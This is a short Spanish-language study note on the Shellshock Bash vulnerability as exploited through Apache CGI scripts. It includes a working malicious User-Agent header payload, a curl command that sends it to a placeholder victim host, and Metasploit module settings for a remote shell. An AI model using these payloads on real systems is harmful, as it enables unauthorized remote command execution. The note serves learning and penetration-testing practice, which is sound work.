
---
- Tags: #CVE #Linux #Apache #Bashscript 
- -- 

# Qué es?

**Shellshock es una vulnerabilidad en Bash**, no en Apache directamente.
El problema rádica en que Bash interpreta **variables de entorno maliciosas** como comandos.

Apache → ejecuta un CGI → usa Bash → 💣 **ejecución remota de comandos**


_Un CGI: no es nada más que un script ejecutable a través de Apache_

## Requisitos para que Shellshock funcione

- Apache  
- CGI habilitado  
- Bash vulnerable  
- Endpoint accesible (`/cgi-bin/`)


# Explotación 

Anteriormente bash permitía: 

```bash
VAR=() { :; }; comando
```

Lo cual creaba una variable de entorno nula, pero, **enseguida ejecutaba un comando**.

**Apache pasa headers HTTP como variables de entorno**

_Ya que los CGI_ se ejecutan con bash, Apache interpreta los Headers con **bash**. Por tanto, ejecuciíon de comandos. 

**Header:**

```bash
User-Agent: () { :; }; echo; echo; /bin/bash -c "whoami"
```

**Podemos comprobar con:**

```bash
curl -H 'User-Agent: () { :; }; echo; echo; /bin/bash -c "id"' http://VICTIMA/cgi-bin/test.cgi
```


## 1. Con Metasploit

Podemos usar el módulo:

```bash
exploit/multi/http/apache_mod_cgi_bash_env_exec
```

**Se configura:**

```bash
set RHOSTS 10.10.10.5
set TARGETURI /cgi-bin/test.cgi
set LHOST 10.10.14.3
set LPORT 4444
```

